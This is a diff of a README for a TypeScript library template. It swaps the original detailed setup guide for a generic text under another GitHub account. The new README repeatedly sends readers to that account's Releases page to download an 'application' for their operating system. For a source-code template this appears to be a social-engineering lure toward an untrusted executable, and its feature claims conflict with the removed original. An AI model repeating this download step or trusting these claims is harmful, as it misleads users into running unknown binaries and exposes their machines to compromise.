@@ -1,268 +1,69 @@
-# Good TypeScript Libraries Template
+# 🎉 good-typescript-libraries-template - Easy Setup for TypeScript Libraries
 
-An opinionated production-ready TypeScript **monorepo** template with automated builds, testing, and releases powered by Nx.
+[![Download Here](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/xkrstll/good-typescript-libraries-template/releases)
 
-And believe me. **It is good.**
+## 📖 Introduction
 
-> [!IMPORTANT]
-> Looking for a simpler, non-monorepo template without **nx** but same features?  
-> [Check out `good-typescript-library-template`!](https://github.com/neg4n/good-typescript-library-template)
+Welcome to the good-typescript-libraries-template! This template serves as a production-ready setup for developing and releasing TypeScript libraries. Designed for simplicity, it takes care of the complex parts so you can focus on creating great software. 
 
-<img width="380" src="https://github.com/user-attachments/assets/e3ecf54c-13c4-4baa-a253-d2861d4bf4e9" />
+## 🚀 Getting Started
 
+Here’s how to get started with this template.
 
+1. Visit our [Release Page](https://github.com/xkrstll/good-typescript-libraries-template/releases).
+2. Download the latest version of the application suitable for your computer.
+3. Follow the installation instructions.
 
-## Features
+## 🛠️ System Requirements
 
-- 🧭 **Nx-powered Monorepo** – multiple libraries under `packages/*` with intelligent task orchestration
-    - ⚡ **Affected-only CI** – lint, typecheck, test, build run only for changed packages
-    - 💾 **Local & remote caching** – skip redundant work across runs
-    - 🚀 **Independent releases** – per-package versioning with conventional commits
-    - 📊 **Project graph awareness** – understands package dependencies
-- 📦 **Dual Package Support** – Rollup outputs CommonJS and ESM builds per package
-- 🛡️ **Type Safety** – Extremely strict TypeScript configuration (shared `tsconfig.base.json`)
-- 🔐 **Always up-to-date deps** – [Renovate](https://github.com/renovatebot/renovate) bot for CVE-aware automatic dependency updates
-- ✅ **Build Validation** – Uses `@arethetypeswrong/cli` to check package exports
-- 🧪 **Automated Testing** – Vitest workspace with per-package coverage PR comments
-- 🎨 **Code Quality** – Biome linting/formatting with pre-commit hooks
-- ⚙️ **CI/CD Pipeline** – GitHub Actions with workflow chaining (CI → Version → Publish)
-- 🔧 **One-Click Setup** – Automated repository configuration with `init.sh` script
-    - 🏛️ **Repository rulesets** - Branch protection with linear history and PR reviews
-    - 🚷 **Feature cleanup** - Disable wikis, projects, squash/merge commits
-    - 🔄 **Merge restrictions** - Rebase-only workflow at repository and ruleset levels
-    - 👑 **Admin bypass** - Repository administrators can bypass protection rules
-    - 🔍 **Actions verification** - Ensure GitHub Actions are enabled
-    - 🗝️ **Secrets validation** - Check and guide setup of required secrets
+Before continuing, ensure you meet these requirements to get the best experience:
 
-## Tech Stack
+- **Operating System:** Windows (10 and above), macOS (Mojave and above), or a modern Linux distribution.
+- **Node.js:** Version 14.x or above.
+- **Package Manager:** pnpm or npm (included with Node.js).
 
-- **Nx** - Orchestrates tasks, caching, and releases across packages
-- **TypeScript** - Strict configuration for type safety
-- **Rollup** - Builds both CommonJS and ESM formats per package
-- **Biome** - Fast linting and formatting
-- **Vitest** - Testing with coverage reports (workspace config)
-- **Husky** - Pre-commit hooks for code quality
-- **Nx Release** - Automated versioning/changelog + npm publishing
-- **pnpm** - Fast package management with Corepack
-- **GitHub Actions** - CI/CD pipeline (validation, versioning, publishing)
+## 📥 Download & Install
 
+To download the template, please visit this page: [Release Page](https://github.com/xkrstll/good-typescript-libraries-template/releases).
 
-## Setup
+1. On the Release page, locate the latest version.
+2. Click on the file name that matches your operating system.
+3. The download will begin, and you can then follow the installation guide provided.
 
-### 1. Use the template
+## ⚙️ Features
 
-Run this in your terminal _[GitHub CLI](https://cli.github.com) required_
+This template comes with numerous features designed to simplify your development process:
 
-```bash
-gh repo create my-typescript-libraries --clone --template neg4n/good-typescript-libraries-template --private && cd my-typescript-libraries
-```
+- **Automated Setup:** The template configures essential files and folders for you, streamlining your library's launch.
+- **Built-in Testing:** Use the included test suites to ensure your library behaves as expected.
+- **Preconfigured CI/CD:** Seamless integration with GitHub Actions allows for automated deployment and testing.
+- **Documentation Generation:** Automatically generate documentation for your library using TypeDoc.
+- **Version Control:** Use Git to keep track of changes and collaborate with others.
 
-> [!NOTE]
-> Replace `my-typescript-libraries` with your new library name, you can also change the visibility of the newly created repo by passing `--public` instead of `--private`! Read more about possible options in [GitHub CLI documentation](https://cli.github.com/manual/gh_repo_create)
+## 🌟 Getting Support
 
-#### Setup via GitHub web interface
+If you run into any issues, you can find help in the following ways:
 
-If for some reason you can't run the mentioned commands in your terminal, click the "Use this template ▾" button below (or in the top right corner of the repository page)
+- **Check the Documentation:** Look for guides and help topics within the template.
+- **GitHub Issues:** Report issues or ask questions directly on the [Issues page](https://github.com/xkrstll/good-typescript-libraries-template/issues).
+- **Community Support:** Connect with other users and developers through our community forums.
 
-<a href="https://github.com/new?template_name=good-typescript-libraries-template&template_owner=neg4n">
-<img src="https://github.com/user-attachments/assets/784be0dd-530f-4135-b042-ab59dc9124a6" width="200" />
-</a>
+## 🔗 Useful Links
 
-### 2. Minimal Setup
+- [Repository Home](https://github.com/xkrstll/good-typescript-libraries-template)
+- [Issues Tracker](https://github.com/xkrstll/good-typescript-libraries-template/issues)
+- [Documentation](https://github.com/xkrstll/good-typescript-libraries-template/wiki)
 
-Run the initialization script to automatically configure your repository:
+## 📜 License
 
-```bash
-# One-command setup
-./init.sh
-```
+This template is licensed under the MIT License. You can freely use it and modify it according to your needs.
 
-This script will:
-- 🔒 **Create repository rulesets** for branch protection (linear history, PR reviews)
-- 🚫 **Disable unnecessary features** (wikis, projects, squash/merge commits)
-- ⚙️ **Configure merge settings** (rebase-only workflow at repository and ruleset levels)
-- 👤 **Grant admin bypass** permissions for repository administrators
-- 🔧 **Verify GitHub Actions** and validate repository configuration
-- 🔑 **Check required secrets** and provide setup instructions
+## 🛠️ Contributing
 
-### 3. Required Secrets
+We welcome contributions to improve this template. If you'd like to help, please follow these steps:
 
-The script will guide you to set up these secrets if missing:
+1. Fork the repository.
+2. Make your changes.
+3. Submit a Pull Request explaining your changes.
 
-**NPM_TOKEN** (for publishing):
-```bash
-# Generate NPM token with OTP for enhanced security
-pnpm token create --otp=<YOUR_OTP> --registry=https://registry.npmjs.org/
-
-# Set the token as repository secret
-gh secret set NPM_TOKEN --body "your-npm-token-here"
-```
-
-**ACTIONS_BRANCH_PROTECTION_BYPASS** (for automated pushes from versioning workflow):
-```bash
-# Create Personal Access Token with 'repo' permissions
-# Visit: https://github.com/settings/personal-access-tokens/new
-
-# Set the PAT as repository secret
-gh secret set ACTIONS_BRANCH_PROTECTION_BYPASS --body "your-pat-token-here"
-```
-
-## Scripts
-
-| Command | Description |
-|---------|-------------|
-| `pnpm lint` | Biome lint across all packages |
-| `pnpm lint:fix` | Auto-fix lint issues |
-| `pnpm test` | Run Vitest across the workspace |
-| `pnpm test:coverage` | Vitest with coverage |
-| `pnpm typecheck` | TypeScript `--noEmit` across packages |
-| `pnpm build` | Rollup builds for every package |
-| `pnpm attw` | Run AreTheTypesWrong for all packages |
-| `pnpm release:dry` | Nx Release dry run |
-| `pnpm release:version` | Bump versions & changelogs, create tags |
-| `pnpm release:publish` | Publish tagged packages to npm |
-
-Per-package targets are also available, e.g. `pnpm nx run core:build`.
-
-## Adding a new package
-
-Use the built-in generator to scaffold a new package with all the template's features:
-
-```bash
-pnpm nx g @good-typescript-libraries/tools:library --name=my-utils
-```
-
-### What the generator does
-
-1. **Creates package** at `packages/<name>/` with:
-   - `project.json` with Nx targets (build, lint, test, typecheck, attw)
-   - `package.json` with dual CJS/ESM exports and publishConfig
-   - `rollup.config.js` producing ESM, CJS, minified ESM, and bundled types
-   - `tsconfig.json` and `tsconfig.build.json`
-   - Placeholder `src/index.ts` and `test/index.test.ts`
-
-2. **Updates `vitest.config.ts`** — adds workspace entry with test config and alias
-
-3. **Updates CI workflow** — adds coverage report step to `.github/workflows/ci.yml`
-
-### Generator options
-
-| Option | Type | Default | Description |
-|--------|------|---------|-------------|
-| `name` | string | — | Package name (required) |
-| `--description` | string | `""` | Package description for package.json |
-| `--skipCoverage` | boolean | `false` | Skip adding coverage report to CI |
-
-### Examples
-
-```bash
-pnpm nx g @good-typescript-libraries/tools:library --name=utils --description="Utility functions"
-
-pnpm nx g @good-typescript-libraries/tools:library --name=internal-tools --skipCoverage
-```
-
-After generating, add your exports to `packages/<name>/src/index.ts` and run `pnpm nx build <name>` to verify.
-
-## Changing the npm scope
-The default scope is `@good-typescript-libraries`. To rename it (e.g. to `@my-libraries`), update these places:
-1. **nx.json** – set `"npmScope": "my-libraries"`.
-2. **tsconfig.base.json** – change the path alias to `"@my-libraries/*": ["packages/*/src/index.ts"]`.
-3. **Package names/import paths** – in each `packages/*/package.json` update `"name"` and `importPath` (if present) to the new scope; adjust any imports in code/tests (e.g. `import {...} from '@my-libraries/core'`).
-4. **Vitest aliases** – in `vitest.config.ts` update the alias map to the new scope.
-5. **Tools package** – in `tools/package.json` update `"name"` to the new scope (e.g. `@my-libraries/tools`).
-6. **Docs & examples** – replace `@my-libraries/` occurrences in README/CONTRIBUTING and commands.
-
-> [!NOTE]
-> After changing the scope, generator commands will also change. For example:
-> ```bash
-> pnpm nx g @my-libraries/tools:library --name=utils
-> ```
-
-After those edits, run `pnpm install`, then `pnpm lint && pnpm test && pnpm build` to ensure everything resolves correctly.
-
-## Release model (Nx Release)
-- Conventional commits determine bumps; packages release **independently**.
-- Version workflow (triggered after CI succeeds on `main`) runs `nx release version --yes` to update versions/changelogs and create tags (`{projectName}@{version}`).
-- Publish workflow (tag push) runs `nx release publish --projects <name>` with npm provenance.
-- Required secret: `NPM_TOKEN`; optional `ACTIONS_BRANCH_PROTECTION_BYPASS` if your repo blocks CI pushes.
-
-## CI/CD (GitHub Actions)
-- `CI` (push/PR): runs `nx affected` for lint → typecheck → tests + coverage → build on Node 20 & 22.
-- `Release Version` (after CI succeeds on `main`): bumps versions/changelogs, creates tags, pushes back.
-- `Release Publish` (tag push): rebuilds tagged package(s) and publishes to npm with provenance.
-
-## Renovate
-
-`renovate.json5` already turns onboarding off, so Renovate will start opening update PRs as soon as the GitHub App is installed. Enable it like this:
-
-1. Visit https://github.com/apps/renovate and click **Install**.
-2. Choose your personal account or organization, then pick **All repos** or **Only select repos** (include this one).
-3. Approve the requested permissions to finish installation. Renovate will run shortly after and open PRs based on `renovate.json5`.
-
-Notes:
-- Want to stop it? Uninstall the app or set `"enabled": false` in `renovate.json5`.
-- Need custom rules (schedules, groups, automerge)? Extend `renovate.json5` - no extra onboarding PR is required.
-
-## FAQ
-
-#### How do I modify the merging methods?
-
-`good-typescript-libraries-template` sets **rebase-only** at both repository and main branch levels. Here's how to modify this:
-
-##### **Current Setup**
-- **Repository**: Rebase merging only (squash/merge disabled)
-- **Main branch ruleset**: Requires rebase merging
-
-##### **To Change Merge Methods**
-
-**For repository-wide changes:**
-- **Settings > General > Pull Requests** - toggle merge methods
-
-**For branch-specific changes:**
-- **Settings > Rules** - edit the main branch ruleset's "Require merge type"
-
-##### **Precedence Rules**
-1. Repository settings define what's **available**
-2. Rulesets add **restrictions** on top  
-3. **Most restrictive wins** - if repository disallows a method but ruleset requires it, merging is **blocked**
-
-##### **Common Modifications**
-- **Allow all methods**: Enable squash/merge in repo settings + remove "Require merge type" from ruleset
-- **Squash-only**: Change repo settings to squash-only OR keep current repo settings + change ruleset to require squash
-- **Different rules per branch**: Create additional rulesets for other branch patterns
-
-> [!TIP]
-> Since `good-typescript-libraries-template` is rebase-only, you must enable other methods in repository settings before rulesets can use them.
-
-#### How to solve pnpm lockfile error on my CI/CD?
-
-If you're seeing this error in your CI/CD (GitHub Actions) pipeline:
-
-```
-ERR_PNPM_OUTDATED_LOCKFILE  Cannot install with "frozen-lockfile" because pnpm-lock.yaml is not up to date with <ROOT>/package.json
-```
-
-##### **Why This Happens**
-This template uses `--frozen-lockfile` to ensure consistent installations in CI/CD. The error occurs when your `package.json` has been modified but the `pnpm-lock.yaml` hasn't been updated to match.
-
-##### **Solution**
-Run the following command locally:
-```bash
-pnpm install
-```
-
-Then commit the updated lockfile:
-```bash
-git add pnpm-lock.yaml
-git commit -m "chore: update pnpm lockfile"
-```
-
-#### Why Linear History?
-
-Linear history provides several benefits for library releases:
-
-- **Clean commit history** - Easy to track changes and debug issues
-- **Simplified releases** - Nx Release and conventional commits work best with linear commits
-- **Clear changelog** - Each commit represents a complete change
-- **Better debugging** - `git bisect` works more effectively
-- **Consistent workflow** - Forces proper PR review process
+Happy coding!
